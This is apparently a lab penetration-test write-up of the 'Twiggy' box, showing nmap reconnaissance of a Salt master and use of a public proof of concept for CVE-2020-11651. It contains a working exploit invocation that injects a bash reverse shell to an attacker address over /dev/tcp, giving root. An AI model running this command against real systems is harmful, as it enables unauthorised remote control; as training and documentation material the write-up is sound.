# Report-Twiggy

Vulnerability Exploited:
SaltStack Salt API – Authentication Bypass & Remote Code Execution (CVE-2020-11651)

System Vulnerable:
192.168.132.62

Vulnerability Explanation:
The Salt API service exposed on TCP port 8000 is vulnerable to an authentication bypass vulnerability (CVE-2020-11651).
This vulnerability allows an unauthenticated attacker to execute arbitrary commands on the Salt master

Severity:
Critical


## Information	Gathering:

Full Nmap scan of all ports:

```bash
nmap -sC -sV -p- $ip
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 17:23 -0500
Nmap scan report for 192.168.205.62
Host is up (0.060s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.03 seconds
```

Enumeration of port 80 using a browser:


<img width="956" height="474" alt="Pasted image 20260118000109" src="https://github.com/user-attachments/assets/ca6fce61-4bb2-47cb-8ab8-b5a2214e3fda" />


Further enumeration of port 8000 using a browser:
```text
X-Upstream: salt-api/3000-1
```
<img width="598" height="570" alt="Pasted image 20260117233555" src="https://github.com/user-attachments/assets/1120d873-2e22-4c09-b26a-2d0ceedde2ec" />

Searching Exploit-DB for PoC on salt-api's vulnerability:
<img width="1208" height="395" alt="Pasted image 20260119114344" src="https://github.com/user-attachments/assets/ae898666-5740-469a-852d-8c514e608295" />

Proof of concept Code:https://github.com/jasperla/CVE-2020-11651-poc

### Confirming RCE:

Env:
```
python3 -m venv salt
```
```
source salt/bin/activate
```
```
pip3 install salt pyyaml looseversion packaging tornado msgpack distro jinja2 zmq
```

RCE Command:
```
python3 exploit.py --master $ip --exec "bash -i >& /dev/tcp/192.168.45.234/80 0>&1"
```
<img width="1176" height="245" alt="Pasted image 20260119115356" src="https://github.com/user-attachments/assets/91a3b429-f582-44ca-aab3-f6992f435503" />

Listener on attacking machine:

<img width="621" height="347" alt="Pasted image 20260119115417" src="https://github.com/user-attachments/assets/7596e3a6-78e9-4b82-a812-9d5f07048813" />

The reverse shell was obtained as the root user.

Successful command execution confirmed that the target is vulnerable to CVE-2020-11651.
